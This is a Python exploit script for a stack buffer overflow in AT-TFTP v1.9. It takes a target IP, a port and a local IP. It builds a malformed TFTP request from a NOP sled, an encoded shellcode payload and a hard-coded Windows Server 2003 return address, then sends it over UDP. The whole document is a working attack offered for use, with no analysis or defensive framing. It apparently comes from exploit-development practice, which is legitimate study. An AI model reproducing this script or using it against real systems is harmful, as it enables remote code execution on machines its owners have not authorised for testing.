# AT-TFTP v1.9 Exploit
# Written by Klem*

import sys, socket
 
# Use in the form "python attftp_long_filename.py <IP Address> <Port> <Your IP Address>"
 
host = sys.argv[1]		# Recieve IP from user
port = int(sys.argv[2])		# Recieve Port from user
lhost = sys.argv[3]

ret = "\x1b\xa0\x86\x7c"	#little endian windows server 2003 ret address

#shellcode max space 
buf =  ""
buf += "\x6a\x2e\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13"
buf += "\x43\x5c\xd8\xcd\x83\xeb\xfc\xe2\xf4\xc2\xb0\x74\xc0"
buf += "\x43\x5c\x24\xa7\xa8\x1b\x30\x34\xbc\xa3\x27\xad\x72"
buf += "\x87\x53\xb0\x7f\xd7\xa4\xf0\x3b\x5d\x37\x46\x14\x7c"
buf += "\xd9\x27\xc8\x68\x42\xcc\xad\x6d\x18\x54\xef\x9d\x12"
buf += "\xc0\x42\x9e\x5c\x0d\x36\xaa\x9b\xab\x7a\x96\xad\x2e"
buf += "\x08\xd7\x97\xe9\x42\xb5\xbe\x46\x5f\x05\x53\x82\x5f"
buf += "\x5d\x31\xce\x6f\xc5\x51\xa1\x67\x40\xb9\x32\xa3\x6d"
buf += "\x03\xa9\xc8\x1f\xe8\x46\x03\x50\x53\xbd\x5f\xf1\x53"
buf += "\xa5\x4b\x02\xbe\x9e\x25\x34\xeb\xff\x2b\x2b\xab\xff"
buf += "\x1c\x08\xbe\x74\x31\x3c\x27\x1b\xd6\x0f\x8b\x9e\x10"
buf += "\x1f\x8b\x8e\x10\xd5\x3f\xab\xc2\xb3\xd0\xcf\x14\x0f"
buf += "\xbe\x74\xa4\x83\x27\x1b\x25\xe5\x70\xa2\xbc\x8a\x4f"
buf += "\xa5\x49\x57\xd8\x5a\x25\x34\xd9\x76\x25\x0f\x51\x2e"
buf += "\x29\x4c\x8b\x9a\x25\xe5\x8f\xc8\xbc\x8a\x88\x79\x4f"
buf += "\x0c\x8b\x9a\x10\x3a\x61\x0d\x7b\xa3\x3e\xcd"

nopsled = "\x90"*(25-len(lhost)+(210-len(buf)))
 
exploit = "\x00\x02" + nopsled + buf + ret + "\x83\xc4\x28\xc3\x00netascii\x00"
				# Our future exploit location
 
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)	# Declare a UDP socket
client.sendto(exploit, (host, port))				# Send the exploit over UDP to the nominated addresses

